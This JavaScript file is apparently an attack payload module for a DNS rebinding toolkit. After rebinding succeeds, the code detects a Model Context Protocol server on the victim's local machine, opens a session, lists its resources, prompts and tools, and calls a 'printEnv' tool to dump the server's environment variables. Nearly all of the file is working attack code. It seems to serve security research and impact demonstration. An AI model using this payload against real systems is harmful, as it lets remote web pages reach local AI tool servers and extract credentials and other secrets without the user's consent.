/**
 * Model Context Protocol (MCP) over HTTP(S) via DNS rebinding
 * Minimal client: detect MCP server, initialize session, list tools.
 * Reference: MCP uses JSON-RPC 2.0 and may expose HTTP POST + SSE streams.
 * Default local ports vary; many dev servers bind 127.0.0.1.
 */

const McpStreamableHttp = () => {
	let server_endpoint = "/mcp";

	// JSON-RPC message ID counter
	let rpcId = 1;

	function nextId() { return rpcId++; }

	function jsonrpc(method, params) {
		return {
			jsonrpc: "2.0",
			id: nextId(),
			method,
			params: params || {}
		};
	}

	// Helper function to make authenticated MCP requests
	async function makeMcpRequest(method, params, endpoint = server_endpoint) {
		return await makeMcpRequestRaw(method, params, endpoint).then(r => r.text());
	}

	async function makeMcpRequestRaw(method, params, endpoint = server_endpoint) {
		const req = jsonrpc(method, params);
		const headers = {
			'content-type': 'application/json',
			'accept': 'application/json, text/event-stream'
		};

		if (sessionId) {
			headers['mcp-session-id'] = sessionId;
		}

		return await sooFetch(endpoint, {
			method: 'POST',
			credentials: 'omit',
			headers,
			body: JSON.stringify(req)
		});
	}

	let sessionId = null;

	// Invoked after DNS rebinding has been performed
	async function attack(_headers, _cookie, _body, _wsProxyPort) {
		try {
			// Attempt to detect and initialize MCP server via HTTP POST.
			// Common path guesses; some servers serve at '/'. We try root first.

			// Initialize MCP session with proper protocol
			const initResponse = await makeMcpRequestRaw("initialize", {
				protocolVersion: "2024-11-05",
				capabilities: {},
				clientInfo: {
					name: "singularity",
					version: "0.0.1"
				}
			});

			const initRespText = await initResponse.text();

			// Extract session ID from response headers
			const sessionIdHeader = initResponse.headers.get('mcp-session-id');
			if (sessionIdHeader) {
				sessionId = sessionIdHeader;
				console.log('Extracted MCP session ID from headers:', sessionId);
			}

			console.log(`MCP init raw: ${initRespText}`);
			let initResp;

			// Parse SSE format if present, otherwise try JSON
			if (initRespText.includes('event: message')) {
				// Extract JSON from SSE format: data: {...}
				const dataMatch = initRespText.match(/data: (.+)$/m);
				if (dataMatch) {
					try {
						initResp = JSON.parse(dataMatch[1]);
					} catch (_e) { }
				}
			} else {
				try {
					initResp = JSON.parse(initRespText);
				} catch (_e) { }
			}

			if (!initResp || initResp.error) {
				console.log('MCP init failed or not MCP.');
				return;
			}

			console.log('MCP initialize OK:', initResp);

			// Extract session information if provided
			if (initResp.result?.sessionId) {
				sessionId = initResp.result.sessionId;
				console.log('Extracted session ID:', sessionId);
			}

			// IMPORTANT: Complete the initialization handshake before sending other requests
			// The initialized notification tells the server initialization is complete
			try {
				const initializedRespText = await makeMcpRequest("notifications/initialized", {});
				console.log('MCP initialized notification sent');
				
				// Give the server a moment to process the notification
				await new Promise(resolve => setTimeout(resolve, 100));
			} catch (_e) {
				console.log('MCP initialized notification failed:', _e.message);
			}

			function parseMcpResponse(text) {
				let resp;
				if (text.includes('event: message')) {
					const dataMatch = text.match(/data: (.+)$/m);
					if (dataMatch) {
						try {
							resp = JSON.parse(dataMatch[1]);
						} catch (_e) { }
					}
				} else {
					try {
						resp = JSON.parse(text);
					} catch (_e) { }
				}
				return resp;
			}

			// Try to list available functionality - prioritize based on server capabilities
			// Based on server capabilities: resources (subscribe: true), prompts, tools, logging, completions
			const methods = [
				"resources/list",
				"ping",
				"prompts/list",
				"tools/list",
				"logging/list",
				"completions/list"
			];
			
			for (const method of methods) {
				try {
					const methodResponseText = await makeMcpRequest(method, {});

					let methodResp = parseMcpResponse(methodResponseText);

					if (methodResp && !methodResp.error) {
						console.log(`MCP ${method}:`, methodResp);
					} else {
						console.log(`MCP ${method} failed:`, methodResp?.error || 'No response');
					}
				} catch (_e) {
					console.log(`MCP ${method} error:`, _e.message);
				}
			}

			// Special case for the everything server, demonstrate impact dumping environment variables
			// Finally try the printenv call via the method `tools/call` method:
			const printenvRespText = await makeMcpRequest("tools/call", {
				name: "printEnv",
				arguments: {},
				_meta: {
					progressToken: 0
				}
			});
			let printenvResp = parseMcpResponse(printenvRespText);
			if (printenvResp && !printenvResp.error) {
				
				// Parse and display environment variables in a table format
				if (printenvResp.result?.content?.[0]?.text) {
					try {
						const envVars = JSON.parse(printenvResp.result.content[0].text);
						console.log(`📊 Extracted ${Object.keys(envVars).length} environment variables:`);
						
						// Create console table of environment variables
						console.table(envVars);
						
					} catch (_e) {
						console.log('📄 Raw environment data (unparseable JSON):');
						console.log(printenvResp.result.content[0].text.substring(0, 500) + '...');
					}
				}
			} else {
				console.log('MCP printenv response failed:', printenvResp?.error || 'No response');
			}
		} catch (e) {
			console.log(`MCP attack error: ${e}`);
		}
	}

	// Invoked to determine whether the rebinded service is likely MCP
	async function isService(_headers, _cookie, _body) {
		// Heuristic: Try POST with a harmless JSON-RPC call; if valid JSON-RPC response, assume MCP-capable
		try {
			const respText = await makeMcpRequest("ping", {}, "/mcp");

			let json;

			// Parse SSE format if present, otherwise try JSON
			if (respText.includes('event: message')) {
				const dataMatch = respText.match(/data: (.+)$/m);
				if (dataMatch) {
					try {
						json = JSON.parse(dataMatch[1]);
					} catch (_e) { return false; }
				}
			} else {
				try {
					json = JSON.parse(respText);
				} catch (_e) { return false; }
			}

			// Accept either result or error of JSON-RPC format as signal that JSON-RPC endpoint exists
			return typeof json === 'object' && (json.result !== undefined || json.error !== undefined) && json.jsonrpc === '2.0';
		} catch (_e) {
			return false;
		}
	}

	return { attack, isService };
}

// Registry value and manager-config.json value must match
Registry["MCP Streamable HTTP"] = McpStreamableHttp();
